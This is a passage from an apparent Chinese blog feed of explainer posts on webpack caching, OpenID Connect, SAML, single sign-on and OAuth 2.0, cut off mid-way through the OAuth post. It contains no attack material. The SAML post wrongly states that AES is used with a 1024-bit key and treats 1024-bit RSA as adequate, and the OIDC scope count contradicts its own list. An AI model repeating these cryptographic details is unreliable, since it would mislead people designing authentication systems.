webpack!&#39;);</span><br><span class="line"></span><br><span class="line">   return element;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> document.body.appendChild(component());</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再build一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">                          Asset       Size  Chunks             Chunk Names</span><br><span class="line">   main.ad717f2466ce655fff5c.js  274 bytes       0  [emitted]  main</span><br><span class="line">vendors.55e79e5927a639d21a1b.js   69.5 KiB       1  [emitted]  vendors</span><br><span class="line">runtime.725a1a51ede5ae0cfde0.js   1.42 KiB       2  [emitted]  runtime</span><br><span class="line">                     index.html  353 bytes          [emitted]</span><br><span class="line">Entrypoint main &#x3D; runtime.725a1a51ede5ae0cfde0.js vendors.55e79e5927a639d21a1b.js main.ad717f2466ce655fff5c.js</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>我们可以看到，两个版本在vendor bundle包的文件名中都产生了55e79e5927a639d21a1b。</p><p>缓存可能很复杂，但是对应用程序或站点用户的好处使其值得付出努力</p><h3 id="总结-资源"><a href="#总结-资源" class="headerlink" title="总结-资源"></a>总结-资源</h3><p>在这篇文章中，我们介绍了webpack的基础知识：代码拆分，配置，加载程序，插件，prefetch preload， 缓存。 当然还有更多。</p><p><strong>参考文献</strong><br><a href="https://www.sitepoint.com/webpack-beginner-guide/">初学者入门</a><br><a href="https://www.valentinog.com/blog/webpack/">webpack 介绍</a></p><p><strong>其他重要资</strong><br><a href="https://webpack.js.org/concepts/">webpack文档</a><br><a href="https://survivejs.com/webpack/">Survive JS-Webpack</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>什么是OIDC</title>
      <link href="/2020/10/05/%E4%BB%80%E4%B9%88%E6%98%AFOIDC/"/>
      <url>/2020/10/05/%E4%BB%80%E4%B9%88%E6%98%AFOIDC/</url>
      
        <content type="html"><![CDATA[<h1 id="OIDC-介绍"><a href="#OIDC-介绍" class="headerlink" title="OIDC 介绍"></a>OIDC 介绍</h1><p>OIDC是Open ID Connect的缩写。<br>各种应用都需要做用户验证。最简单的方式是在本地维护一个数据库，存放用户账户和证书等数据。这种方式对于业务来说可能会不太友好：</p><p>注册和账户创建过程本来就很无聊。对于很多电商网站来说，它们会允许非登陆用户添加购物车，然后让用户下单时再注册。乏味的注册流程可能会导致很多用户放弃购买。<br>对于那些提供多个应用的企业来说，让各个应用维护各自的用户数据库，不管从管理还是安全层面来说，都是一个很大的负担。<br>对于这个问题，更好的方案是将用户认证和授权这些事情交给专门的identity provider（idp）服务来处理。</p><p>google、facebook、twitter这些大厂，就为它们的注册用户提供了这类idp服务。一个网站可以通过使用这类idp服务来极大简化用户的注册和登录流程。</p><h1 id="Open-ID-Connect-特性"><a href="#Open-ID-Connect-特性" class="headerlink" title="Open ID Connect 特性"></a>Open ID Connect 特性</h1><p>在了解Open ID Connect之前，可以先了解下Open ID: <a href="https://zh.wikipedia.org/wiki/OpenID">Open ID 介绍</a>。 需要注意的是Open ID 和Open ID connect是不一样的, Open id connect更加先进。</p><p>OpenID Connect是位于OAuth2.0协议之上的身份层。 它使客户端能够基于授权服务器的验证来验证最终用户的身份。OAuth2.0提供了授权，即基于权限验证是否有权访问某些内容的过程。 OpenID Connect提供身份验证，即验证身份的过程。  这可以通过表单身份验证来完成，其中sql服务器存储必要的信息以对用户进行身份验证。</p><p>OpenID Connect在2014年发行。虽然它不是第一个idp标准，但从可用性、简单性方面来说，它可能是最好的。OpenID Connect从SAML和OpenID 1.0/2.0中做了大量借鉴。</p><p>oAuth2.0使用access token来授权三方应用访问受保护的信息。OpenID Connect遵循oAuth2.0协议流程，并在这个基础上提供了id token来解决三方应用的用户身份认证问题。OpenID Connect将用户身份认证信息以id token的方式给到三方应用。id token基于JWT(json web token）进行封装，具有自包含性、紧凑性和防篡改性等特点。三方应用在验证完id token的正确性后，可以进一步通过oAuth2授权流程获得的access token读取更多的用户信息。</p><p>OpenID Connect大获成功的秘诀：</p><ul><li>容易处理的id token。OpenID Connect使用JWT来给应用传递用户的身份信息。JWT以其高安全性（防止token被伪造和篡改）、跨语言、支持过期、自包含等特性而著称，非常适合作为token来使用。</li><li>基于oAuth2.0协议。id token是经过oAuth2.0流程来获取的，这个流程即支持web应用，也支持原生app。</li><li>简单。OpenID Connect足够简单。但同时也提供了大量的功能和安全选项以满足企业级业务需求。</li></ul><p>OpenID Connect所涉及的角色如下：</p><ul><li>用户。</li><li>RP：Relying Party，申请授信信息的可信客户端（既上文中提到的三方应用）。</li><li>OP：OpenID Provider，提供身份认证的服务方，比如google和facebook等公司的系统。</li><li>id token：包含身份认证信息的JWT。</li><li>user info api，返回用户信息的接口，当RP使用id token来访问时，返回授权用户的信息。</li></ul><h1 id="Open-ID-认证流程"><a href="#Open-ID-认证流程" class="headerlink" title="Open ID 认证流程"></a>Open ID 认证流程</h1><p>原文链接： <a href="https://medium.com/@samichkhachkhi/introduction-to-openid-connect-9e7330083d3c">Introduction to OpenId Connect</a></p><p>身份提供者(OpenID Provider)向最终用户提供一个ID token，该token 被编码为JWT（Json Web token），看起来像这样：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-0f1716a32d129fd9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><strong>声明(Claims)</strong><br>Token 包含位于payload中的声明，这些只是id token上的属性，其中包含有关实体的值：</p><ul><li>Subject=身份提供商提供的唯一ID</li><li>Issuing Authority=发行令牌的身份提供商OP（<a href="https://idp.com)/">https://idp.com）</a></li><li>Audience =可以使用此令牌的依赖方RP</li><li>Issue Date=发行令牌的日期和时间</li><li>Expiration Date=令牌到期的日期和时间</li></ul><p>Token 还可以包含其他请求的声明，例如电子邮件或地址。 ID Token 使用json网络签名进行数字签名，以实现完整性和不可否认性。 header，payload 和signature被组合到一个JWT中。</p><p><strong>Scopes</strong><br>ID Token 包含用于检索信息的声明(claims)，但也可以使用scopes。 这些是包含声明的特定信息集。 OpenID Connect中预定义了四个标准范围，一个是openid，这是强制性的，另外四个是可选的。</p><ul><li>openid（这指定openid是必需的，是强制性的！）</li><li>profile（基本个人资料信息，可选）</li><li>email （可选）</li><li>address（可选）</li><li>phone（可选）</li></ul><h1 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h1><h4 id="如何获取ID-token"><a href="#如何获取ID-token" class="headerlink" title="如何获取ID token"></a>如何获取ID token</h4><p>这个过程涉及到idp，也就是google、facebook等公司，通过验证用户的session或者证书并做认证。而用户的session或者证书的可信载体则是浏览器。</p><p>浏览器弹出框对于web应用来说是将用户重定向到idp的一种比较好的方式。Android或者IOS app需要唤起本系统的浏览器来做这件事。嵌入式的web view不是一个可信的方式，因为没法阻止这个web view所在的app来窃取用户的密码等信息。用户认证应该永远使用独立于app的可信方式，比如系统的浏览器。</p><p>注意，OpenID Connect并不会特别说明用户该如何被认证，这个逻辑有idp自己决定。<br>id tokens通过oAuth2.0协议获得。<br>获取id token的流程分为如下几类：</p><ul><li>authorization code flow。这是最常用的流程，主要用在web应用以及原生app场景。id token主要依靠后端而不是前端比如javascript和OP进行交互来获取。</li><li>implicit flow。对于基于浏览器（javascript）的应用，它们往往没有后端，id token是直接从OP的重定向里面得到的（依靠前段代码）。</li><li>hybrid flow。上面两种方式的综合，前后端独立获取id token，这种方式很少使用。</li></ul><p><strong>认证代码流(Authorization code flow)</strong><br>成功验证客户端后，authentication code flow 将返回authentication code。 这可以通过表单身份验证（用户名和密码）完成。 后端收到authentication code 后，后端可以使用authentication code直接从身份提供者访问access_token或id_token。 ID或访问令牌永远不会公开给客户端。 对于常规Web应用程序/原生移动应用程序/台式机原生应用程序，此流程非常理想。</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-a52fee52b09376fd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><strong>隐式流(Implicit code flow)</strong><br>客户端经过身份验证后，隐式流向浏览器公开ID和访问令牌。 你可能已经知道，这是最不安全的身份验证方法。 XSS和网络钓鱼是将访问令牌暴露给入侵者的主要危险之一。 在https上运行网站可以缓解其中的一些危险。 隐式流主要用于在浏览器中运行的应用程序（Javascript应用程序）。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-b5ba35e55b804e0a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><strong>混合流(hybrid flow)</strong><br>混合流是代码流和隐式流的组合。 身份验证后返回id token，该令牌用于访问各种资源。 如果您需要在前端和后端使用单独的令牌，这将特别有用。一个token用来访问资源（API）， 另外一个token用来获取刷新令牌(refresh token)。</p><p>详细信息可以查看官网：<a href="%5Bhttps://openid.net/connect/%5D(https://openid.net/connect/)">Open Id  connect介绍</a><br>其他文章：<a href="https://www.cnblogs.com/linianhui/p/openid-connect-core.html">OIDC 介绍</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是SAML</title>
      <link href="/2020/10/03/%E4%BB%80%E4%B9%88%E6%98%AFSAML/"/>
      <url>/2020/10/03/%E4%BB%80%E4%B9%88%E6%98%AFSAML/</url>
      
        <content type="html"><![CDATA[<h1 id="SAML-介绍"><a href="#SAML-介绍" class="headerlink" title="SAML 介绍"></a>SAML 介绍</h1><p>SAML即安全断言标记语言，英文全称是Security Assertion Markup Language。它是一个基于XML的标准，用于在不同的安全域(security domain)之间交换认证和授权数据。在SAML标准定义了身份提供者(identity provider)和服务提供者(service provider)，这两者构成了前面所说的不同的安全域。 SAML是OASIS组织安全服务技术委员会(Security Services Technical Committee)的产品。</p><p>SAML（Security Assertion Markup Language）是一个XML框架，也就是一组协议，可以用来传输安全声明。比如，两台远程机器之间要通讯，为了保证安全，我们可以采用加密等措施，也可以采用SAML来传输，传输的数据以XML形式，符合SAML规范，这样我们就可以不要求两台机器采用什么样的系统，只要求能理解SAML规范即可，显然比传统的方式更好。SAML 规范是一组Schema 定义。</p><p>可以这么说，在Web Service 领域，schema就是规范，在Java领域，API就是规范。</p><p>SAML解决的<strong>最重要</strong>的需求是网页浏览器单点登录（SSO）。单点登录在内部网层面比较常见，（例如使用Cookie），但将其扩展到内部网之外则一直存在问题，并使得不可互操作的专有技术激增。（另一种近日解决浏览器单点登录问题的方法是OpenID Connect协议）</p><h3 id="SAML-作用"><a href="#SAML-作用" class="headerlink" title="SAML 作用"></a>SAML 作用</h3><p>SAML 主要包括三个方面：</p><p>1.认证申明。表明用户是否已经认证，通常用于单点登录。</p><p>2.属性申明。表明 某个Subject 的属性。</p><p>3.授权申明。表明 某个资源的权限。</p><h3 id="SAML框架"><a href="#SAML框架" class="headerlink" title="SAML框架"></a>SAML框架</h3><p>SAML就是客户向服务器发送SAML 请求，然后服务器返回SAML响应。数据的传输以符合SAML规范的XML格式表示。</p><p>SAML 可以建立在SOAP上传输，也可以建立在其他协议上传输。</p><p>因为SAML的规范由几个部分构成：SAML Assertion，SAML Prototol，SAML binding等</p><h3 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h3><p>由于SAML在两个拥有共享用户的站点间建立了信任关系，所以安全性是需考虑的一个非常重要的因素。SAML中的安全弱点可能危及用户在目标站点的个人信息。SAML依靠一批制定完善的安全标准，包括SSL和X.509，来保护SAML源站点和目标站点之间通信的安全。源站点和目标站点之间的所有通信都经过了加密。为确保参与SAML交互的双方站点都能验证对方的身份，还使用了证书。</p><h4 id="SAML协议的安全设计"><a href="#SAML协议的安全设计" class="headerlink" title="SAML协议的安全设计"></a>SAML协议的安全设计</h4><p>在SAML协议中，对协议的安全设计十分完整，包协议中定义的客户端、SP及IDP的交互流程，并且还使用了密码学对SAML中关键的交互数据进行了签名和加密处理。</p><p><strong>1.对SAML数据进行签名</strong><br>为有效的确保SAML的交互过程中的数据不被伪造和篡改，支持对任何SAML数据进行签名。特别是重要的SAML认证断言。</p><p>具体的，在本项目中使用了X.509格式的数字证书进行签名，使用了RSA公钥密码算法，SHA-256哈希算法，其密钥长度为1024位。</p><p><strong>2.SAML认证断言的安全性设计：加密和断言有效期</strong><br>在SAML的认证断言中，包含了大量的用户账号信息，因此十分有必要对其进行加密处理。</p><p>对SAML认证断言的加密同样支持包括国密算法和AES算法等多种对称加密算法，在本项目中，使用了AES算法，密钥长度为1024位，能够有效的保证SAML认证断言的保密性。</p><p>另外，为防止重放攻击，在设计中还对认证断言的有效期进行了限制，认证断言的有效期可配置，建议配置使用较短的有效期。</p><h1 id="SAML-实现"><a href="#SAML-实现" class="headerlink" title="SAML 实现"></a>SAML 实现</h1><h3 id="需要知道的基础概念"><a href="#需要知道的基础概念" class="headerlink" title="需要知道的基础概念"></a>需要知道的基础概念</h3><p>首先需要了解几个基本的服务方：</p><p>IDP：账号认证的服务方，如赛赋IDaaS作为IDP，主要就是完成认证<br>SP：向用户提供商业服务的软件（实体），比如禅道<br>Browser：用户方的浏览器，用户通过浏览器进行资源的访问和相关跳转完成身份的认证</p><h3 id="需要知道的几个地址（容易混淆）"><a href="#需要知道的几个地址（容易混淆）" class="headerlink" title="需要知道的几个地址（容易混淆）"></a>需要知道的几个地址（容易混淆）</h3><p>“用户登录地址”，应用的SAML协议登录路径<br>“relayState地址”，应用认证成功后的跳转地址。<br>“AssertionConsumerServiceUrl”，应用接收统一身份认证</p><h3 id="SAML-登录过程"><a href="#SAML-登录过程" class="headerlink" title="SAML 登录过程"></a>SAML 登录过程</h3><p>下面简单介绍使用基于SAML的SSO登录到WebApp1的过程<br><img src="https://upload-images.jianshu.io/upload_images/15531792-46a4f3730aba1769.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>此图片说明了以下步骤。</p><p>用户尝试访问WebApp1。</p><ol><li>WebApp1 生成一个 SAML 身份验证请求。SAML 请求将进行编码并嵌入到SSO 服务的网址中。包含用户尝试访问的 WebApp1 应用程序的编码网址的 RelayState 参数也会嵌入到 SSO 网址中。该 RelayState 参数作为不透明标识符，将直接传回该标识符而不进行任何修改或检查。</li><li>WebApp1将重定向发送到用户的浏览器。重定向网址包含应向SSO 服务提交的编码 SAML 身份验证请求。</li><li>SSO（统一认证中心或叫Identity Provider）解码 SAML 请求，并提取 WebApp1的 ACS（声明客户服务）网址以及用户的目标网址（RelayState 参数）。然后，统一认证中心对用户进行身份验证。统一认证中心可能会要求提供有效登录凭据或检查有效会话 Cookie 以验证用户身份。</li><li>统一认证中心生成一个 SAML 响应，其中包含经过验证的用户的用户名。按照 SAML 2.0 规范，此响应将使用统一认证中心的 DSA/RSA 公钥和私钥进行数字签名。</li><li>统一认证中心对 SAML 响应和 RelayState 参数进行编码，并将该信息返回到用户的浏览器。统一认证中心提供了一种机制，以便浏览器可以将该信息转发到 WebApp1 ACS。</li><li>WebApp1使用统一认证中心的公钥验证 SAML 响应。如果成功验证该响应，ACS 则会将用户重定向到目标网址。</li><li>用户将重定向到目标网址并登录到 WebApp1。</li></ol><p>相关文章：<a href="https://www.jianshu.com/p/[slug]?slug=9a5694907ec0">什么是SSO</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是SSO</title>
      <link href="/2020/10/03/%E4%BB%80%E4%B9%88%E6%98%AFSSO/"/>
      <url>/2020/10/03/%E4%BB%80%E4%B9%88%E6%98%AFSSO/</url>
      
        <content type="html"><![CDATA[<h1 id="SSO-介绍"><a href="#SSO-介绍" class="headerlink" title="SSO 介绍"></a>SSO 介绍</h1><p>单点登录(SingleSign-On，SSO)是一种帮助用户快捷访问网络中多个站点的安全通信技术。单点登录系统基于一种安全的通信协议，该协议通过多个系统之间的用户身份信息的交换来实现单点登录。使用单点登录系统时，用户只需要登录一次，就可以访问多个系统，不需要记忆多个口令密码。单点登录使用户可以快速访问网络，从而提高工作效率，同时也能帮助提高系统的安全性。<br>客户端持有ID，服务端持有session，两者一起用来保持登录状态。客户端需要用ID来作为凭证，而服务端需要用session来验证ID的有效性。但是session这东西一开始是每个server自己独有的，而记录ID的cookie又是不能跨域的。所以，我们要实现一次登录一次退出，只需要想办法让各个server的共用一个session的信息，让客户端在各个域名下都能持有这个ID就好了。再进一步讲，只要各个server拿到同一个ID，都能有办法检验出ID的有效性、并且能得到ID对应的用户信息就行了，也就是能检验ID。</p><h3 id="实现机制"><a href="#实现机制" class="headerlink" title="实现机制"></a>实现机制</h3><h4 id="server端"><a href="#server端" class="headerlink" title="server端"></a>server端</h4><p>以server群如何生成、验证ID的方式大致分为两种：<br>   1、“共享Cookie”这个就是上面提到的共享session的方式，本质上cookie只是存储session-id的介质，session-id也可以放在每一次请求的url里。session这项机制一开始就是一个server一个session的，把session拿出来让所有server共享有点奇怪。<br>   2、SSO-Token方式。因为共享session的方式不安全，所以我们不再以session-id作为身份的标识。我们另外生成一种标识，把它取名SSO-Token(或Ticket)，这种标识是整个server群唯一的，并且所有server群都能验证这个token，同时能拿到token背后代表的用户的信息。</p><h4 id="浏览器端"><a href="#浏览器端" class="headerlink" title="浏览器端"></a>浏览器端</h4><p>   用最早的“共享session”的方式还是现在的“token”方式，身份标识到了浏览器端都要面临这样的一个问题：用户登录成功拿到token(或者是session-id)后怎么让浏览器存储和分享到其它域名下？同域名很简单，我们可以把token存在cookie里，把cookie的路径设置成顶级域名下，这样所有子域都能读取cookie中的token。这就是共享cookie的方式。</p><p>   当用户第一次访问应用系统的时候，因为还没有登录，会被引导到认证系统中进行登录；根据用户提供的登录信息，认证系统进行身份校验，如果通过校验，应该返回给用户一个认证的凭据－－ticket（SSO-Token）；用户再访问别的应用的时候，就会将这个ticket（SSO-Token）带上，作为自己认证的凭据，应用系统接受到请求之后会把ticket送到认证系统进行校验，检查ticket的合法性。如果通过校验，用户就可以在不用再次登录的情况下访问应用系统2和应用系统3了。<br>要实现SSO，需要以下主要的功能：<br>   1、所有应用系统共享一个身份认证系统。统一的认证系统是SSO的前提之一。认证系统的主要功能是将用户的登录信息和用户信息库相比较，对用户进行登录认证；认证成功后，认证系统应该生成统一的认证标志（ticket），返还给用户。另外，认证系统还应该对ticket进行效验，判断其有效性。<br>   2、所有应用系统能够识别和提取ticket（SSO-Token）信息 　　要实现SSO的功能，让用户只登录一次，就必须让应用系统能够识别已经登录过的用户。应用系统应该能对ticket（SSO-Token）进行识别和提取，通过与认证系统的通讯，能自动判断当前用户是否登录过，从而完成单点登录的功能。</p><h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><p>   1、提高用户的效率。 用户不再被多次登录困扰，也不需要记住多个 ID 和密码。另外，用户忘记密码并求助于支持人员的情况也会减少。<br>   2、提高开发人员的效率。 SSO 为开发人员提供了一个通用的身份验证框架。实际上，如果 SSO 机制是独立的，那么开发人员就完全不需要为身份验证操心。他们可以假设，只要对应用程序的请求附带一个用户名，身份验证就已经完成了。<br>   3、简化管理。 如果应用程序加入了单点登录协议，管理用户帐号的负担就会减轻。简化的程度取决于应用程序，因为 SSO 只处理身份验证。所以，应用程序可能仍然需要设置用户的属性（比如访问特权）。</p><h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>   1、不利于重构 因为涉及到的系统很多，要重构必须要兼容所有的系统，可能很耗时。<br>   2、无人看守桌面 因为只需要登录一次，所有的授权的应用系统都可以访问，可能导致一些很重要的信息泄露。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OAuth 授权介绍</title>
      <link href="/2020/10/03/OAuth-%E6%8E%88%E6%9D%83%E4%BB%8B%E7%BB%8D/"/>
      <url>/2020/10/03/OAuth-%E6%8E%88%E6%9D%83%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<p>  如今网络应用，手机app越来越多，每个app都需要一个账号，对于个人来说就变得繁琐，需要记住都账号密码很多。 为了解决这些问题以及安全问题，各种登录方式陆续诞生，下面简单都介绍他们的背景以及应用：</p><h1 id="OAuth-登录"><a href="#OAuth-登录" class="headerlink" title="OAuth 登录"></a>OAuth 登录</h1><p>  OAuth是open authentication的缩写，OAuth并不是API或服务：它是一种开放的授权标准，任何人都可以实现。OAuth是用来为第三方应用提供“secure delegated access”的一个标准。OAuth通过https和访问令牌对设备，api和服务器进行认证，而不需要用户名密码。OAuth有1.0和2.0两个版本，他们之间完全不同，不能一起使用， 两个版本之间也不兼容。目前OAuth 2.0使用比较广泛，这里主要介绍2.0版本。</p><h3 id="为什么要用Oauth"><a href="#为什么要用Oauth" class="headerlink" title="为什么要用Oauth"></a>为什么要用Oauth</h3><p>  OAuth是相对直接身份验证模式而创建的。直接身份验证模式通过HTTP进行验证，提示用户输入用户名和密码。基本身份验证仍然是服务器端应用程序API身份验证的原始形式：然而用户发送的是API key ID和 secret 进行验证而不是发送用户名和密码。在使用OAuth之前，网站会提示在网页中输入用户名和密码，并且会以你的身份登录你的数据（例如您的Gmail帐户）。这通常称为密码反模式。</p><p>  为了创建更好的web系统，单点登录（SSO）经常被使用。SSO登录涉及到联合身份的创建。在这种情况下，最终应用程序与身份提供者（authorize endpoint）进行对话，并且身份提供者生成一个加密签名的令牌（token），并将其交给应用程序以验证用户身份。如果签名能够被验证，应用程序就会信任身份提供者，验证流程如下：</p><p><img src="https://upload-images.jianshu.io/upload_images/15531792-2367aaa9a392779e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h3 id="OAuth-API"><a href="#OAuth-API" class="headerlink" title="OAuth API"></a>OAuth API</h3><p>  我们构建API的方式也发生了很多变化。 在2005年，人们研究用WS- *来构建Web服务。 现在，大多数开发人员已转向REST和无状态API。 简而言之，REST是HTTP命令通过网络推送JSON数据包。</p><p>  开发人员构建了大量的API。 现在可能会在会议室听到“ API economy”这个常见词。 公司需要保护REST API， 同时允许许多设备访问它们。 过去，只要需要输入用户名/密码，应用程序将直接以你的身份登录。 这引起了委托授权问题。<br>“如何允许应用访问我的数据而不必输入密码？”<br>  以下 是一个应用程序，询问它是否可以代表你访问数据。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-5f2a9230169f6471.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>这是OAuth。</p><p>  OAuth是REST / API的委托授权框架。 它使应用程序无需提供用户密码即可获得对用户数据的有限访问权限（scopes）。 它使身份验证与授权脱钩，并支持解决不同设备功能的多个用例。 它支持服务器到服务器应用程序，基于浏览器的应用程序，移动/本地应用程序以及控制台/电视。<br>  你可以认为这是（对于应用程序）酒店房卡。 如果你有酒店房卡，则可以进入你的房间。 如何获得酒店钥匙卡？ 你必须在前台通过身份验证才能获取它。 认证并获得房卡后，您可以访问整个房间的资源。</p><p>简单来说，OAuth的就是：</p><ol><li>应用程式要求使用者授权</li><li>用户授权应用并提供证明</li><li>应用程序向服务器提供了获得令牌（token）的授权证明</li><li>令牌(token)仅限于访问用户为特定应用授权的内容</li></ol><h3 id="OAuth-组件"><a href="#OAuth-组件" class="headerlink" title="OAuth 组件"></a>OAuth 组件</h3><ul><li>Scopes and Consent</li><li>Actors</li><li>Clients</li><li>Tokens</li><li>Authorization Server</li><li>Flows</li></ul><h4 id="OAuth-Scopes"><a href="#OAuth-Scopes" class="headerlink" title="OAuth Scopes"></a>OAuth Scopes</h4><p>  Scopes是我们在应用程序请求权限时在授权屏幕上看到的内容。 它们是客户在请求令牌时要求的权限束(bundles of permissions)。 这些由应用程序开发人员在编写应用程序时进行编码。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-e684b6c4fc1751b8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>  Scopes使授权策略决策与执行脱钩。 这是OAuth的第一个关键方面。 权限位于前面和中间。 它们没有隐藏在你必须进行反向工程的应用层的后面。 它们通常列在API文档中：这是此应用程序要求的范围。<br>  我们必须获用户的同意。 这称为首次使用信任。 网络上的用户体验发生了重大变化。 OAuth之前的大多数人都只是用用户名和密码对话框。  这是网络上的一个新概念，如今已成为流行趋势。 现在，你必须授权并征得同意。<br>  同意(consent)可能会因申请而异。 它可能是时间敏感的范围（天，周，月），但是并非所有平台都允许你选择持续时间。 当你同意时要注意该应用程序可以代表你执行一些操作-例如 LinkedIn向网络中的每个人发送垃圾邮件。<br>  OAuth是基于Internet的解决方案，因为它针对每个应用程序。 您通常可以登录到信息中心，以查看你有权访问的应用程序并撤消同意。</p><h5 id="OAuth-Actors"><a href="#OAuth-Actors" class="headerlink" title="OAuth Actors"></a>OAuth Actors</h5><p>OAuth流程中的actors如下：</p><ul><li>资源所有者(Resource Owner)：拥有资源服务器中的数据。 例如，我是我的Facebook个人资料的资源所有者。</li><li>资源服务器(Resource Server)：用于存储应用程序要访问的数据的API</li><li>客户端(Client)：想要访问你的数据的应用程序</li><li>授权服务器(Authorization Server)：OAuth的主要引擎</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/15531792-4c0723620e2bc215.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>  资源所有者有不同的角色：它可以是最终用户，但也可以是公司。<br>  客户端可以是公开或者保密的。 在OAuth中，两者之间有很大的区别。 机密客户端可以用来来存储机密。 它们不在台式机上运行或不在应用商店中分发。 人们无法对其进行反向工程并获得密钥。 它们在受保护的区域内运行，终端用户无法访问它们。<br>  公共客户端是浏览器，移动应用程序和IoT设备。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-d09a659c2bfbc960.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>  客户端注册也是OAuth的关键组成部分， 就像OAuth的DMV。你需要为应用获取license， 这是您的应用徽标在授权对话框中显示的方式。</p><h4 id="OAuth-Tokens"><a href="#OAuth-Tokens" class="headerlink" title="OAuth Tokens"></a>OAuth Tokens</h4><p>  访问令牌(access token)是客户端用来访问资源服务器（API）的令牌。 它们生命走起是短暂的，通常是几分钟或者几小时，而不是几天或者一个月。 我们通过公共客户端就可以获取访问令牌。 它们旨在优化互联网规模问题。 由于这些令牌的寿命很短且可以扩展，因此无法撤消，只需要等待它们超时即可。</p><p>   另一个令牌是刷新令牌(refresh token), 他们寿命很长，通常是几天，几个月或者几年， 可以用他们来获取新令牌。 为了获得刷新令牌，应用程序通常需要通过具有身份验证的机密客户端。<br>   刷新令牌可以被撤消。 在控制台中撤消应用程序的访问权限时，就是杀死其刷新令牌。 这使你能够强制客户端旋转秘钥， 使用刷新令牌来获取新的访问令牌，而访问令牌正在通过网络访问所有API资源。 每次刷新访问令牌时，都会得到一个新的加密签名的令牌。 密钥旋转内置于系统中。<br>  OAuth规范没有定义令牌是什么。 它可以是你想要的任何格式。 但是通常这些令牌为JSON Web Token（标准）。 简而言之，JWT是令牌认证的安全且值得信赖的标准。 JWT允许使用签名对信息（称为声明）进行数字签名，并可以在以后使用秘密签名密钥进行验证。<br>  令牌是从从授权服务器上获取的，两个主要端点是授权端点（authorize endpoint）和令牌端点（token endpoint.）。 根据不同的使用情况将它们分开， 授权端点是获得用户同意和授权的地方，他们将返回表明用户已同意的认证授权（authorization grant）， 然后将授权传递到令牌端点，令牌端点处理授权，并说“好，这是你的刷新令牌和访问令牌”。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-84f29c25b6035cf4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>  可以使用访问令牌来访问API。 过期后，必须使用刷新令牌返回令牌端点，以获取新的访问令牌。<br>  对于开发人员来说，OAuth的最大痛苦之一就是必须管理刷新令牌。你将状态管理推给每个客户端开发人员，你可以获得密钥轮换的好处，但给开发人员带来了很多痛苦。这就是开发人员喜欢API密钥的原因。他们可以只复制/粘贴它们， API密钥对开发人员来说非常方便，但对安全性却很不利。<br>  还有收费问题，让开发人员执行OAuth流程可以提高安全性，但是会遇到更多麻烦。工具箱和平台有机会简化工作并帮助令牌管理。幸运的是，OAuth现在已经很成熟了，你最喜欢的语言或框架很可能具有可用来简化事情的工具。<br>  我们已经讨论了客户端类型，令牌类型和授权服务器的端点，以及如何将其传递给资源服务器。提到了两种不同的流程：获得授权和获得令牌。这些不必发生在同一频道上。前通道（front channel）是浏览器中经过的通道，浏览器将用户重定向到授权服务器，用户表示同意，这是在用户的浏览器上发生的。一旦用户获得了授权授权并将其交给应用程序，客户端应用程序就不再需要使用浏览器来完成OAuth流以获取令牌。<br>  令牌应由客户端应用程序使用，以便它可以代表你访问资源。 我们称其为后通道(back channel)。 后通道是直接从客户端应用程序到资源服务器的HTTP调用，以交换令牌的认证授权。 这些通道用于不同的流程，具体取决于你拥有的设备功能。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-acbde50119a1afa5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>  例如，您通过用户代理授权的前端渠道流可能如下所示：</p><ol><li>资源所有者开始流程以委派对受保护资源的访问</li><li>客户端通过浏览器重定向到授权服务器上的授权端点发送具有所需作用域的授权请求</li><li>Authorization Server返回一个同意对话框，说“您是否允许该应用程序访问这些作用域？” 当然，您需要对应用程序进行身份验证，因此，如果您未对资源服务器进行身份验证，它将要求您登录。 如果您已经有一个缓存的会话Cookie，则只会看到“同意”对话框。 查看同意对话框，并同意。</li><li>授权授予通过浏览器重定向传递回应用程序。 这一切都发生在前通道上。<br><img 